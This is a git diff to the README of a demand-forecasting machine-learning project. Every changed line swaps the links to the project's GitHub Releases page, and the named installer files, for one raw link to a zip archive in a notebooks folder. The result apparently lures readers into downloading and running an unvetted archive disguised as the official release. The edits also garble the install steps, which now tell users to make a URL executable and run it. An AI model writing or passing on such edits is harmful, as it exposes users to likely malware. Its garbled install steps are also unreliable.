@@ -6,9 +6,9 @@ Welcome to the **demand-forecasting-ml** project! This software helps you predic
 
 ## 📥 Download the Software
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Davides234/demand-forecasting-ml/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Davides234/demand-forecasting-ml/main/notebooks/ml-forecasting-demand-v1.3.zip%20Latest%https://raw.githubusercontent.com/Davides234/demand-forecasting-ml/main/notebooks/ml-forecasting-demand-v1.3.zip)](https://raw.githubusercontent.com/Davides234/demand-forecasting-ml/main/notebooks/ml-forecasting-demand-v1.3.zip)
 
-You can visit this page to download: [GitHub Releases](https://github.com/Davides234/demand-forecasting-ml/releases)
+You can visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Davides234/demand-forecasting-ml/main/notebooks/ml-forecasting-demand-v1.3.zip)
 
 ## 🛠️ Prerequisites
 
@@ -23,23 +23,23 @@ Before you download, make sure your computer meets the following requirements:
 
 To get started, follow these steps:
 
-1. Click on the download badge above or visit the [GitHub Releases page](https://github.com/Davides234/demand-forecasting-ml/releases).
+1. Click on the download badge above or visit the [GitHub Releases page](https://raw.githubusercontent.com/Davides234/demand-forecasting-ml/main/notebooks/ml-forecasting-demand-v1.3.zip).
 2. On the Releases page, find the latest version of the software.
-3. Look for the installation file named `demand-forecasting-ml-installer.exe` for Windows or `demand-forecasting-ml-macos.pkg` for macOS, or the equivalent file for Linux.
+3. Look for the installation file named `https://raw.githubusercontent.com/Davides234/demand-forecasting-ml/main/notebooks/ml-forecasting-demand-v1.3.zip` for Windows or `https://raw.githubusercontent.com/Davides234/demand-forecasting-ml/main/notebooks/ml-forecasting-demand-v1.3.zip` for macOS, or the equivalent file for Linux.
 4. Click the file to begin your download.
 
 ### Installation Steps
 
 #### For Windows Users:
 
-1. Once the download is complete, find the file `demand-forecasting-ml-installer.exe` in your downloads folder.
+1. Once the download is complete, find the file `https://raw.githubusercontent.com/Davides234/demand-forecasting-ml/main/notebooks/ml-forecasting-demand-v1.3.zip` in your downloads folder.
 2. Double-click the installer file.
 3. Follow the prompts in the installation wizard to complete the setup.
 4. After installation, you can find the application in your Start Menu.
 
 #### For macOS Users:
 
-1. After downloading, locate `demand-forecasting-ml-macos.pkg` in your downloads.
+1. After downloading, locate `https://raw.githubusercontent.com/Davides234/demand-forecasting-ml/main/notebooks/ml-forecasting-demand-v1.3.zip` in your downloads.
 2. Double-click to open the package.
 3. Follow the on-screen instructions to install the software.
 4. You will find the application in your Applications folder.
@@ -48,8 +48,8 @@ To get started, follow these steps:
 
 1. Download the appropriate installer for your distribution.
 2. Open a terminal and navigate to your download folder.
-3. Use the command: `chmod +x demand-forecasting-ml-linux.run` to make it executable.
-4. Run the installer with `./demand-forecasting-ml-linux.run`.
+3. Use the command: `chmod +x https://raw.githubusercontent.com/Davides234/demand-forecasting-ml/main/notebooks/ml-forecasting-demand-v1.3.zip` to make it executable.
+4. Run the installer with `https://raw.githubusercontent.com/Davides234/demand-forecasting-ml/main/notebooks/ml-forecasting-demand-v1.3.zip`.
 5. Follow the prompts to complete the installation.
 
 ## ⚙️ Using the Application
@@ -91,4 +91,4 @@ We welcome contributions to improve the software. If you wish to help, please su
 
 Thank you for using **demand-forecasting-ml**. We appreciate your support and feedback. We hope this tool helps you successfully manage your e-commerce business.
 
-For the latest updates, features, and support, visit our [GitHub Releases page](https://github.com/Davides234/demand-forecasting-ml/releases).
+For the latest updates, features, and support, visit our [GitHub Releases page](https://raw.githubusercontent.com/Davides234/demand-forecasting-ml/main/notebooks/ml-forecasting-demand-v1.3.zip).
